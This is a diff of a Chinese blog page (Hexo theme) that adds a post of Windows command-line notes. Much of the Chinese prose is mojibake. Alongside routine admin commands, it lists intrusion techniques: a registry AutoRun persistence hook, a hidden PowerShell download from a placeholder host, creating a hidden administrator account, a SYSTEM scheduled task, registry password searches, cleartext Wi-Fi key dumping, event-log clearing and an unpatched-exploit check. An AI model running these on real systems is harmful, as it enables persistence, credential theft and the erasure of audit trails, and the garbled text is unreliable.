@@ -95,6 +95,8 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
+  <meta name="keywords" content="windows," />
+
 
 
 
@@ -111,12 +113,17 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="北门 blog">
-<meta property="og:url" content="http://yoursite.com/index.html">
+<meta name="description" content="�������ڹ�֮�⣬����������  ����һЩ�Լ����õ�windows������Ļ�������£�ȫ���ʼǱ��ݡ����Ĵ󲿷��������Ի�����������ܣ�С�������Ը��˾������ܽᡣ">
+<meta name="keywords" content="windows">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows��������">
+<meta property="og:url" content="http://yoursite.com/2017/03/08/hello-world/index.html">
 <meta property="og:site_name" content="北门 blog">
+<meta property="og:description" content="�������ڹ�֮�⣬����������  ����һЩ�Լ����õ�windows������Ļ�������£�ȫ���ʼǱ��ݡ����Ĵ󲿷��������Ի�����������ܣ�С�������Ը��˾������ܽᡣ">
+<meta property="og:updated_time" content="2017-08-09T13:12:03.302Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="北门 blog">
+<meta name="twitter:title" content="Windows��������">
+<meta name="twitter:description" content="�������ڹ�֮�⣬����������  ����һЩ�Լ����õ�windows������Ļ�������£�ȫ���ʼǱ��ݡ����Ĵ󲿷��������Ի�����������ܣ�С�������Ը��˾������ܽᡣ">
 
 
 
@@ -137,9 +144,9 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/03/08/hello-world/"/>
 
-  <title>  北门 blog -   </title>
+  <title> Windows�������� | 北门 blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="">
@@ -170,9 +177,7 @@
     
   
 
-  <div class="container one-collumn sidebar-position-left 
-   page-home 
- ">
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -299,9 +304,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
   
@@ -321,10 +326,7 @@
             
             
               
-                
-                <a class="post-title-link" href="/2017/03/08/hello-world/" itemprop="url">
-                  Windows��������
-                </a>
+                Windows��������
               
             
           </h1>
@@ -393,48 +395,121 @@
       
 
       
+        <blockquote class="blockquote-center">�������ڹ�֮�⣬����������<br></blockquote>
+
+<p>����һЩ�Լ����õ�windows������Ļ�������£�ȫ���ʼǱ��ݡ����Ĵ󲿷��������Ի�����������ܣ�С�������Ը��˾������ܽᡣ<br><a id="more"></a></p>
+<h3 id="CMD��������"><a href="#CMD��������" class="headerlink" title="CMD��������"></a>CMD��������</h3><p>����ľ��<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">CreateObject(<span class="string">"WScript.Shell"</span>).RegWrite <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Command Processor\AutoRun"</span>, <span class="string">"calc.exe"</span>,<span class="string">"REG_SZ"</span></div></pre></td></tr></table></figure></p>
+<p>ע���������ֵ�󣬵�����cmdʱ����������ļ���������������cmd /k������ԭ��</p>
+<p>�г�ie�������ã�<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reg query <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"</span></div></pre></td></tr></table></figure></p>
+<p>����Զ���ļ���<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile(<span class="string">'http://www.xxx.com/lcx.1'</span>,<span class="string">'d:\\3.txt'</span>)</div></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bitsadmin /rawreturn /transfer getfile http://127.0.0.1:8080/test.zip F:\123.zip</div></pre></td></tr></table></figure>
+<p>��������˺ţ�<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">net user <span class="built_in">test</span>$ <span class="built_in">test</span> /add       ���<span class="built_in">test</span>�û�����Ϊ<span class="built_in">test</span>�������˺�</div><div class="line">net localgroup administrators <span class="built_in">test</span>$ /add ��<span class="built_in">test</span>��ӵ�ϵͳ�û���</div></pre></td></tr></table></figure></p>
+<p>�г����µĲ�����<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wmic qfe list full /format:htable &gt; hotfixes.htm</div><div class="line">wmic qfe get description,installedOn</div></pre></td></tr></table></figure></p>
+<p>��d�̸�Ŀ¼�ݹ����login.html�ļ���<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /d d: &amp;&amp; dir login.html /a<span class="_">-d</span>/b/s</div></pre></td></tr></table></figure></p>
+<p>����ĳ�̷���ĳ��Ŀ¼�£�<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">d: &amp; <span class="built_in">cd</span> d:/Clover</div></pre></td></tr></table></figure></p>
+<p>���´�һ��cmd���У�<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cmd /c  whoami</div></pre></td></tr></table></figure></p>
+<p>��Ӽƻ�����<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">schtasks.exe  /Create /RU <span class="string">"SYSTEM"</span> /SC MINUTE /MO       </div><div class="line">45 /TN FIREWALL /TR <span class="string">"c:/1.ex    e"</span> /ED 2016/12/12</div><div class="line">���԰�RU�����system��Ϊ�Լ����˻����ƣ������Ϳ���ִ����Ӽƻ�������</div></pre></td></tr></table></figure></p>
+<p>������أ�<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">tasklist   �鿴����</div><div class="line">taskkill /im ��������</div><div class="line">taskkill /pid[������] -t(�����ý���) -f(ǿ�ƽ����ý����Լ������ӽ���)</div></pre></td></tr></table></figure></p>
+<p>�鿴windowsϵͳδ���©��������<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> KB2829361=MS13-046&amp;<span class="built_in">set</span> KB2830290=MS13-046&amp;<span class="built_in">set</span> KB2667440=MS12-020&amp;<span class="built_in">set</span> KB2667402=MS12-020&amp;<span class="built_in">set</span> KB3124280=MS16-016&amp;<span class="built_in">set</span> KB3077657=MS15-077&amp;<span class="built_in">set</span> KB3045171=MS15-051&amp;<span class="built_in">set</span> KB2592799=MS11-080&amp;<span class="built_in">set</span> KB952004=MS09-012 PR&amp;<span class="built_in">set</span> KB956572=MS09-012 ��������&amp;<span class="built_in">set</span> KB970483=MS09-020 iis6&amp;<span class="built_in">set</span> KB2124261=MS10-065 ii7&amp;<span class="built_in">set</span> KB2271195=MS10-065 ii7&amp;systeminfo&gt;a.txt&amp;(<span class="keyword">for</span> %i <span class="keyword">in</span> (KB952004 KB956572 KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165 KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280) <span class="keyword">do</span> @<span class="built_in">type</span> a.txt|@find /i <span class="string">"%i"</span>||@<span class="built_in">echo</span> %%i% Not Installed!)&amp;del /f /q /a a.txt</div></pre></td></tr></table></figure></p>
+<p>��ȡ������ע���������ļ�ֵ��<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">REG query HKCU  /v <span class="string">"pwd"</span> /s  <span class="comment">#pwd���滻Ϊpassword \ HKCU ���滻ΪHKCR</span></div></pre></td></tr></table></figure></p>
+<p>ʶ�𿪻���ĳ���:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic startup list full</div></pre></td></tr></table></figure></p>
+<p>ʶ�������е�IP��Mac��<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic nicconfig get ipaddress,macaddress</div></pre></td></tr></table></figure></p>
+<p>�鿴�������<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wmic share get name,path</div><div class="line">net share</div></pre></td></tr></table></figure></p>
+<p>�鿴ϵͳ����־��λ�ã�<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic nteventlog get path,filename,writeable</div></pre></td></tr></table></figure></p>
+<p>ɾ����־��<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">wevtutil cl <span class="string">"windows powershell"</span></div><div class="line">wevtutil cl <span class="string">"security"</span></div><div class="line">wevtutil cl <span class="string">"system"</span></div></pre></td></tr></table></figure></p>
+<p>���еķ���<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sc query <span class="built_in">type</span>= service</div><div class="line">net start</div></pre></td></tr></table></figure></p>
+<p>��װ������Լ��汾��<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic product get name,version</div></pre></td></tr></table></figure></p>
+<p>�鿴ĳ�����̵���ϸ�����<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic process <span class="built_in">where</span> name=<span class="string">"chrome.exe"</span> list full</div></pre></td></tr></table></figure></p>
+<p>��ʾϵͳ�������ӹ����������룺(�Թ���Ա�������)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">netsh wlan show profiles</div><div class="line">netsh wlan show profiles name=<span class="string">"profiles������"</span> key=clear</div></pre></td></tr></table></figure></p>
+<p>һ����ȡ��<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> /f <span class="string">"skip=9 tokens=1,2 delims=:"</span> %i <span class="keyword">in</span> (<span class="string">'netsh wlan show profiles'</span>) <span class="keyword">do</span> @<span class="built_in">echo</span> %j | findstr -i -v <span class="built_in">echo</span> | netsh wlan show profiles %j key=clear</div></pre></td></tr></table></figure></p>
+<p>�鿴�Ƿ�Ϊ�������<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic bios list full | find /i <span class="string">"vmware"</span></div></pre></td></tr></table></figure></p>
+<p>�Ƿ�֧��powershell:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> defined PSModulePath (<span class="built_in">echo</span> ֧��powershell) <span class="keyword">else</span> (<span class="built_in">echo</span> ��֧��powershell)</div></pre></td></tr></table></figure></p>
+<p>���Բ�Ʒ������ͺ���Ϣ��<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic baseboard get  Product,SerialNumber</div></pre></td></tr></table></figure></p>
+<h3 id="CMD����������"><a href="#CMD����������" class="headerlink" title="CMD����������"></a>CMD����������</h3><p>arp -a �г������������л�Ծ��IP��ַ<br>arp -a �ӶԷ�IP�ǲ�Է���MAC��ַ<br>arp -s ��ip + mac����mac��ip��ַ<br>arp -d ��ip + mac�����mac��ip��ַ</p>
+<p>net view                  ——&gt; ��ѯͬһ���ڻ����б�<br>net view /domain    ——&gt; ��ѯ���б�<br>net view /domain:domainname  —–&gt; �鿴workgroup���м�����б�</p>
+<p>ipconfig /all            ——&gt; ��ѯ����IP�Σ��������<br>ipconfig /release<br>ipconfig /renew    ���»�ȡIp��ַ</p>
+<p>telnet ip �˿ںţ������ܷ������Զ�������˿� nbtstat -a �ӶԷ�IP��Է���������<br>tracert ������   �õ�IP��ַ</p>
+<p>netstat -a -n<br>netstat -an | find “3389”<br>netstat -a�鿴������Щ�˿�<br>netstat -n�鿴�˿ڵ������������<br>netstat -v�鿴���ڽ��еĹ���<br>netstat -p tcp/ip�鿴ĳЭ��ʹ�����<br>netstat -s �鿴����ʹ�õ�����Э��ʹ�����</p>
+<p>nbtstat -n ��ȡNetBIOS<br>nslookup ����   ��ѯ������Ӧ��ip</p>
+<h3 id="DO���y�ݼ�"><a href="#DO���y�ݼ�" class="headerlink" title="DO���ÿ�ݼ�"></a>DO���ÿ�ݼ�</h3><p>mspaint������ͼ����<br>calc���������<br>notepad�������±�<br>taskmgr�������������<br>osk��������Ļ����<br>gpedit.msc���������<br>services.msc�������ط���<br>compmgmt.msc�������������<br>devmgmt.msc�����豸������<br>winver�����鿴ϵͳ�汾<br>magnify�����Ŵ�ʵ�ó���<br>eventvwr�����¼��鿴��<br>Regedit������ע���<br>resmon������Դ������<br>WMIC BIOS get releasedate�����鿴������������<br>mstsc -f����Զ�����ӣ�����ȫ����</p>
+<p><em>���Ľ������ռ����£���ӭ������Բ��䣡</em></p>
+
+      
+    </div>
+
+    <div>
+      
         
-          <blockquote class="blockquote-center">�������ڹ�֮�⣬����������<br></blockquote>
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
 
-<p>����һЩ�Լ����õ�windows������Ļ�������£�ȫ���ʼǱ��ݡ����Ĵ󲿷��������Ի�����������ܣ�С�������Ը��˾������ܽᡣ<br>
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2017/03/08/hello-world/#more" rel="contents">
-              Weiterlesen &raquo;
-            </a>
-          </div>
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <p><span>本文标题:</span><a href="/2017/03/08/hello-world/">Windows��������</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 北门 的个人博客">北门</a></p>
+  <p><span>发布时间:</span>2017年03月08日 - 20:03</p>
+  <p><span>最后更新:</span>2017年08月09日 - 21:08</p>
+  <p><span>原始链接:</span><a href="/2017/03/08/hello-world/" title="Windows��������">http://yoursite.com/2017/03/08/hello-world/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2017/03/08/hello-world/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({   
+          title: "",   
+          text: '复制成功',   
+          html: false,
+          timer: 500,   
+          showConfirmButton: false
+        });
+      });
+    }));  
+</script>
+
+      
+    </div>
+
+    <div>
+      
         
+
       
     </div>
 
     <div>
       
-    </div>
+        
 
-    <div>
-      
-    </div>
-
-    <div>
       
     </div>
 
     <footer class="post-footer">
       
-
+        <div class="post-tags">
+          
+            <a href="/tags/windows/" rel="tag"><i class="fa fa-tag"></i>windows</a>
+          
+        </div>
       
 
       
+
       
-        <div class="post-eof"></div>
       
     </footer>
   </article>
 
 
-    
-  </section>
 
-  
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -442,6 +517,13 @@
 
 
           
+  <div class="comments" id="comments">
+    
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8yNzk2Ny80NTQ0">
+      </div>
+  
+  </div>
+
 
         </div>
         
@@ -461,8 +543,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Übersicht
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel  sidebar-panel-active ">
+      <section class="site-overview sidebar-panel ">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
@@ -629,6 +720,17 @@
       </section>
 
       
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#CMD��������"><span class="nav-number">1.</span> <span class="nav-text">CMD��������</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CMD����������"><span class="nav-number">2.</span> <span class="nav-text">CMD����������</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DO���y�ݼ�"><span class="nav-number">3.</span> <span class="nav-text">DO���ÿ�ݼ�</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
 
     </div>
   </aside>
@@ -742,6 +844,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
 
   
 
